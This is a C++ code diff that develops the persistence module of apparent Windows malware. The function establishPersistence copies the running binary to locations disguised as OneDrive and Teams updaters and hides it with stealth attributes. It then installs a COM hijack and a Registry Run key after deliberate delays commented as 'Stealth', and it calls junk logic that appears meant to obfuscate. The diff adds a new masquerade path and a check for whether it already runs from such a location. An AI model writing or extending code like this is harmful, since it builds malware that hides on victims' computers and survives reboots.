@@ -55,6 +55,7 @@ PersistTarget getRandomTarget() {
         wchar_t localAppData[MAX_PATH];
         SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
         targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", L"OneDriveUpdater"});
+        targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Teams\\TeamsUpdate.exe", L"TeamsUpdate"});
     }
     std::uniform_int_distribution<> dis(0, (int)targets.size() - 1);
     return targets[dis(gen)];
@@ -143,12 +144,26 @@ void CreateDirectoryRecursive(const std::wstring& path) {
 
 } // namespace
 
-bool establishPersistence(const std::wstring& overrideSourcePath) {
+std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
     JunkLogic();
     std::wstring sourcePath = overrideSourcePath.empty() ? getExecutablePath() : overrideSourcePath;
     PersistTarget target = getRandomTarget();
 
-    if (lstrcmpiW(sourcePath.c_str(), target.path.c_str()) == 0) return false;
+    // Check if we are already in one of the possible persist targets
+    wchar_t currentPathBuf[MAX_PATH];
+    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
+    std::wstring currentPath(currentPathBuf);
+    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+
+    std::wstring targetPathLower = target.path;
+    std::transform(targetPathLower.begin(), targetPathLower.end(), targetPathLower.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+
+    if (currentPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos ||
+        currentPath.find(L"\\microsoft\\teams\\") != std::wstring::npos ||
+        currentPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) {
+        LOG_INFO("Running from persistence path.");
+        return currentPathBuf;
+    }
 
     CreateDirectoryRecursive(target.path);
     std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
@@ -161,22 +176,29 @@ bool establishPersistence(const std::wstring& overrideSourcePath) {
 
     if (copied) {
         SetFileAttributesStealth(target.path);
+        LOG_INFO("Binary copied to " + utils::ws2s(target.path));
+    } else {
+        LOG_ERR("Failed to copy binary.");
+        return L"";
     }
 
-    Sleep(60000 + (GetTickCount() % 60000));
+    // Stealth: Delayed persistence installation
+    Sleep(30000);
 
+    // 1. COM Hijack
     std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
     if (ComHijacker::Install(target.path, clsid)) {
         LOG_INFO("P1 set.");
     }
 
-    Sleep(120000 + (GetTickCount() % 120000));
+    Sleep(30000);
 
+    // 2. Registry Run
     if (InstallRegistryRun(target.path, target.name)) {
         LOG_INFO("P2 set.");
     }
 
-    return true;
+    return target.path;
 }
 
 void ReinstallPersistence() {
